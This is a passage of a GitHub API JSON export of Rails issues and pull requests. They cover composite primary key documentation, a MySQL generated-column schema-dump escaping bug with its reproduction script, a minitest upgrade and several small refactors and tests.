        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because the documentation for composite primary keys wasn't correct. \r\n\r\n### Detail\r\n\r\nWhile working on `shoulda-matchers` I noticed that the documentation is not correct. We actually need to declare the `query_constraints` option in the `has_many` association using the same attribute name as the ones in the associated object.\r\n\r\n```ruby\r\nclass Author < ApplicationRecord\r\n  self.primary_key = [:first_name, :last_name]\r\n  # This was incorrect as `first_name` and `last_name` don't exist on the `Book` model.\r\n  has_many :books, query_constraints: [:first_name, :last_name] \r\n  \r\n  # Correct way\r\n  has_many :books, query_constraints: [:author_first_name, :author_last_name]\r\nend\r\n\r\nclass Book < ApplicationRecord\r\n  belongs_to :author, query_constraints: [:author_first_name, :author_last_name]\r\nend\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50734/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50734/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50733",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50733/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50733/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50733/events",
        "html_url": "https://github.com/rails/rails/pull/50733",
        "id": 2079359526,
        "node_id": "PR_kwDNIULOY_P1_g",
        "number": 50733,
        "title": "Fix single quote escapes on default generated MySQL columns",
        "user": {
            "login": "yash",
            "id": 32605754,
            "node_id": "MDQ6VXNlcjMyNjA1NzU0",
            "avatar_url": "https://avatars.githubusercontent.com/u/32605754?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yash",
            "html_url": "https://github.com/yash",
            "followers_url": "https://api.github.com/users/yash/followers",
            "following_url": "https://api.github.com/users/yash/following{/other_user}",
            "gists_url": "https://api.github.com/users/yash/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yash/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yash/subscriptions",
            "organizations_url": "https://api.github.com/users/yash/orgs",
            "repos_url": "https://api.github.com/users/yash/repos",
            "events_url": "https://api.github.com/users/yash/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yash/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-12T17:36:51Z",
        "updated_at": "2024-01-17T15:04:45Z",
        "closed_at": "2024-01-17T12:48:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50733",
            "html_url": "https://github.com/rails/rails/pull/50733",
            "diff_url": "https://github.com/rails/rails/pull/50733.diff",
            "patch_url": "https://github.com/rails/rails/pull/50733.patch",
            "merged_at": "2024-01-17T12:48:03Z"
        },
        "body": "Closes https://github.com/rails/rails/issues/50732\r\n\r\n### Motivation / Background\r\n\r\nMySQL 5.7.5+ supports generated columns, which can be used to create a column that is computed from an expression. If single quotes are used in the definition of a default generated column, the schema dump will escape the quotes twice.\r\n\r\nIn a scenario such as the following:\r\n\r\n```ruby\r\ncreate_table :people, force: true do |t|\r\n  t.string :first_name\r\n  t.string :last_name\r\n  t.string :full_name, default: -> { \"(concat(`first_name`,_utf8mb4'-',`last_name`))\" }\r\nend\r\n```\r\n\r\nWe want the schema dump to look like this:\r\n\r\n```ruby\r\nt.string \"full_name\", default: -> { \"(concat(`first_name`,_utf8mb4'-',`last_name`))\" }\r\n```\r\n\r\nAnd not this, which is how it now it is now:\r\n\r\n```ruby\r\nt.string \"full_name\", default: -> { \"(concat(`first_name`,_utf8mb4\\\\'-\\\\',`last_name`))\" }\r\n```\r\n\r\nSee the related issue for more.\r\n\r\n### Detail\r\n\r\nThis pull request changes the schema statement generator under the `elsif` block for a column with `DEFAULT_GENERATED` in the metadata. In the changes, we simply `gsub` the escapes as we do in other parts of the class.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message.\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50733/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50733/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50732",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50732/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50732/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50732/events",
        "html_url": "https://github.com/rails/rails/issues/50732",
        "id": 2079353057,
        "node_id": "I_kwDNIULOe_Bo4Q",
        "number": 50732,
        "title": "Incorrect schema dump of default generated columns with single quotes",
        "user": {
            "login": "yash",
            "id": 32605754,
            "node_id": "MDQ6VXNlcjMyNjA1NzU0",
            "avatar_url": "https://avatars.githubusercontent.com/u/32605754?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yash",
            "html_url": "https://github.com/yash",
            "followers_url": "https://api.github.com/users/yash/followers",
            "following_url": "https://api.github.com/users/yash/following{/other_user}",
            "gists_url": "https://api.github.com/users/yash/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yash/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yash/subscriptions",
            "organizations_url": "https://api.github.com/users/yash/orgs",
            "repos_url": "https://api.github.com/users/yash/repos",
            "events_url": "https://api.github.com/users/yash/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yash/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T17:33:10Z",
        "updated_at": "2024-01-17T12:48:04Z",
        "closed_at": "2024-01-17T12:48:04Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Semi-related issue: https://github.com/rails/rails/issues/49334\r\n\r\nMySQL 5.7.5+ supports generated columns, which can be used to create a column that is computed from an expression. If single quotes are used in the definition of a column with a default generated value, the schema dump will escape the quotes twice.\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem 'rails', git: 'https://github.com/rails/rails.git', branch: '7-1-stable'\r\n  gem \"mysql2\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nActiveRecord::Base.establish_connection(adapter: \"mysql2\", host: \"127.0.0.1\", database: \"test1\", username: \"root\", password: \"\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :people, force: true do |t|\r\n    t.string :first_name\r\n    t.string :last_name\r\n    t.string :full_name, default: -> { \"(concat(`first_name`,_utf8mb4'-',`last_name`))\" }\r\n  end\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_schema_dump\r\n    stream = ActiveRecord::SchemaDumper.dump(ActiveRecord::Base.connection, StringIO.new)\r\n    default_generated_definition = stream.string.split(/\\n/).grep(/t\\.string.*full_name/).first.strip\r\n\r\n    assert_equal \"t.string \\\"full_name\\\", default: -> { \\\"(concat(`first_name`,_utf8mb4\\\\\\\\'-\\\\\\\\',`last_name`))\\\" }\", default_generated_definition\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe output of the schema dump for the default generated column should be the following:\r\n\r\n```ruby\r\nt.string \"full_name\", default: -> { \"(concat(`first_name`,_utf8mb4'-',`last_name`))\" }\r\n```\r\n\r\n### Actual behavior\r\n\r\nThe output of the schema dump for the default generated column is as follows in the current iteration:\r\n\r\n```ruby\r\nt.string \"full_name\", default: -> { \"(concat(`first_name`,_utf8mb4\\\\'-\\\\',`last_name`))\" }\r\n```\r\n\r\nThis results in issues with importing the Ruby schema to an empty database:\r\n\r\n```\r\nActiveRecord::StatementInvalid: Mysql2::Error: syntax error at position 695 near '\\' (ActiveRecord::StatementInvalid)\r\n```\r\n\r\nHowever, upon removing the escapes and reimporting the Ruby schema, it succeeds with the MySQL database in the correct state.\r\n\r\n### System configuration\r\n**Rails version**: `7.0.8`\r\n\r\n**Ruby version**: `ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]`",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50732/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50732/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50731",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50731/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50731/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50731/events",
        "html_url": "https://github.com/rails/rails/pull/50731",
        "id": 2079331695,
        "node_id": "PR_kwDNIULOY_OS5w",
        "number": 50731,
        "title": "Document passing hash as id option on create_table",
        "user": {
            "login": "javierav",
            "id": 99700,
            "node_id": "MDQ6VXNlcjk5NzAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/99700?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/javierav",
            "html_url": "https://github.com/javierav",
            "followers_url": "https://api.github.com/users/javierav/followers",
            "following_url": "https://api.github.com/users/javierav/following{/other_user}",
            "gists_url": "https://api.github.com/users/javierav/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/javierav/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/javierav/subscriptions",
            "organizations_url": "https://api.github.com/users/javierav/orgs",
            "repos_url": "https://api.github.com/users/javierav/repos",
            "events_url": "https://api.github.com/users/javierav/events{/privacy}",
            "received_events_url": "https://api.github.com/users/javierav/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T17:21:32Z",
        "updated_at": "2024-01-12T17:21:36Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50731",
            "html_url": "https://github.com/rails/rails/pull/50731",
            "diff_url": "https://github.com/rails/rails/pull/50731.diff",
            "patch_url": "https://github.com/rails/rails/pull/50731.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThe `id` keyword argument passed to [create_table](https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/SchemaStatements.html#method-i-create_table) method allow to receive a hash with options for column creation but it's not documented.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50731/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50731/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50730",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50730/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50730/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50730/events",
        "html_url": "https://github.com/rails/rails/pull/50730",
        "id": 2079166531,
        "node_id": "PR_kwDNIULOY_FEdQ",
        "number": 50730,
        "title": "Upgrade minitest from 5.20.0 to 5.21.1 to fix mutex_m deprecation",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T15:56:28Z",
        "updated_at": "2024-01-12T19:19:52Z",
        "closed_at": "2024-01-12T18:40:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50730",
            "html_url": "https://github.com/rails/rails/pull/50730",
            "diff_url": "https://github.com/rails/rails/pull/50730.diff",
            "patch_url": "https://github.com/rails/rails/pull/50730.patch",
            "merged_at": "2024-01-12T18:40:07Z"
        },
        "body": "When running any test on the rails test suite, e.g. even doing `rake` a warning would show with:\r\n\r\n```\r\n/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/gems/3.3.0/gems/minitest-5.20.0/lib/minitest.rb:3: warning: mutex_m was loaded from the standard library, but will no longer be part of the default gems since Ruby 3.4.0. Add mutex_m to your Gemfile or gemspec. Also contact author of minitest-5.20.0 to add mutex_m into its gemspec.\r\n```\r\n\r\nThis is fixed in the last version of minitest\r\n\r\n- https://github.com/minitest/minitest/issues/969\r\n- https://github.com/minitest/minitest/blob/master/History.rdoc\r\n- https://github.com/minitest/minitest/commit/5f5c2111f36658fd2636b108b8327ce4b2f3cf8d",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50730/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50730/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50729",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50729/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50729/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50729/events",
        "html_url": "https://github.com/rails/rails/pull/50729",
        "id": 2079104130,
        "node_id": "PR_kwDNIULOY_Bk5Q",
        "number": 50729,
        "title": "Remove nesting to improve readability",
        "user": {
            "login": "koya1616",
            "id": 87183507,
            "node_id": "MDQ6VXNlcjg3MTgzNTA3",
            "avatar_url": "https://avatars.githubusercontent.com/u/87183507?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/koya1616",
            "html_url": "https://github.com/koya1616",
            "followers_url": "https://api.github.com/users/koya1616/followers",
            "following_url": "https://api.github.com/users/koya1616/following{/other_user}",
            "gists_url": "https://api.github.com/users/koya1616/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/koya1616/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/koya1616/subscriptions",
            "organizations_url": "https://api.github.com/users/koya1616/orgs",
            "repos_url": "https://api.github.com/users/koya1616/repos",
            "events_url": "https://api.github.com/users/koya1616/events{/privacy}",
            "received_events_url": "https://api.github.com/users/koya1616/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-12T15:28:23Z",
        "updated_at": "2024-01-12T21:55:49Z",
        "closed_at": "2024-01-12T21:55:49Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50729",
            "html_url": "https://github.com/rails/rails/pull/50729",
            "diff_url": "https://github.com/rails/rails/pull/50729.diff",
            "patch_url": "https://github.com/rails/rails/pull/50729.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because at first, when I read this process, I did not immediately understand the process. I would like to improve readability by doing an early return.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes Removing nesting of if statements in `dangerous_class_method?` [method](https://github.com/rails/rails/blob/main/activerecord/lib/active_record/attribute_methods.rb#L197).\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50729/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50729/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50728",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50728/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50728/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50728/events",
        "html_url": "https://github.com/rails/rails/pull/50728",
        "id": 2079090466,
        "node_id": "PR_kwDNIULOY_A0wA",
        "number": 50728,
        "title": "Add test for not purging non referenced files",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-12T15:22:03Z",
        "updated_at": "2024-01-16T09:47:46Z",
        "closed_at": "2024-01-16T09:47:43Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50728",
            "html_url": "https://github.com/rails/rails/pull/50728",
            "diff_url": "https://github.com/rails/rails/pull/50728.diff",
            "patch_url": "https://github.com/rails/rails/pull/50728.patch",
            "merged_at": null
        },
        "body": "This was probably fixed between Rails 7.1 and Rails c6ef89824 (current main)\r\n\r\nWe encountered this problem on Rails 7.1\r\n\r\n### Motivation / Background\r\n\r\nWe had a change in signed ids that affected our action text rich text (mentions and files). So I edited the rich text content but it deleted some files\r\n\r\n### Detail\r\n\r\nI wanted to fix this on rails main but I noticed it was already fixed, not sure when or by who\r\n\r\n### Additional information\r\n\r\nSee https://github.com/rails/rails/issues/50707\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50728/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50728/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50727",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50727/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50727/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50727/events",
        "html_url": "https://github.com/rails/rails/pull/50727",
        "id": 2078984168,
        "node_id": "PR_kwDNIULOY-65Mw",
        "number": 50727,
        "title": "Action View Tests: Use `#with_routing` helper",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T14:36:26Z",
        "updated_at": "2024-01-29T14:25:41Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50727",
            "html_url": "https://github.com/rails/rails/pull/50727",
            "diff_url": "https://github.com/rails/rails/pull/50727.diff",
            "patch_url": "https://github.com/rails/rails/pull/50727.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nFollow-up to [#49819][]\r\n\r\n### Detail\r\n\r\nSince [#49819][] resolves an issue with\r\n`ActionDispatch::IntegrationTest#with_routing` helper support, Action View's `test/abstract_unit.rb` file can rely on routing being reset within the block argument.\r\n\r\nThis means that the `RoutedRackApp` class and `.build_app` method is can be made unnecessary.\r\n\r\n[#49819]: https://github.com/rails/rails/pull/49819\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50727/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50727/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50726",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50726/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50726/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50726/events",
        "html_url": "https://github.com/rails/rails/issues/50726",
        "id": 2078920939,
        "node_id": "I_kwDNIULOe-nQ6w",
        "number": 50726,
        "title": "Requiring `'active_support/core_ext/integer/time'` alone raises an exception",
        "user": {
            "login": "josegomezr",
            "id": 5963207,
            "node_id": "MDQ6VXNlcjU5NjMyMDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5963207?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/josegomezr",
            "html_url": "https://github.com/josegomezr",
            "followers_url": "https://api.github.com/users/josegomezr/followers",
            "following_url": "https://api.github.com/users/josegomezr/following{/other_user}",
            "gists_url": "https://api.github.com/users/josegomezr/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/josegomezr/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/josegomezr/subscriptions",
            "organizations_url": "https://api.github.com/users/josegomezr/orgs",
